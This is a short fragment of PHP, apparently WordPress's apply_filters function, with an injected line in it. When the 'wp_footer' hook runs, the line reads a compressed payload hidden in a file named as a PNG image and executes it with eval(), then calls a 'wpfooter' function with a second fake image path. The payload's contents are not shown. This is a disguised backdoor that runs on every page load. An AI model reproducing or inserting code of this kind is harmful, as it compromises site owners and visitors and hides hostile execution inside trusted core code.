...
function apply_filters($tag, $string) {
	...
	if($tag == "wp_footer"){ eval(gzuncompress(file_get_contents("/home/mydimension/www/images/masthead_refine.png")));wpfooter("/home/mydimension/www/images/backgrount.png", 10);}
	if ( !isset($wp_filter[$tag]) ) {
		return $string;
	}
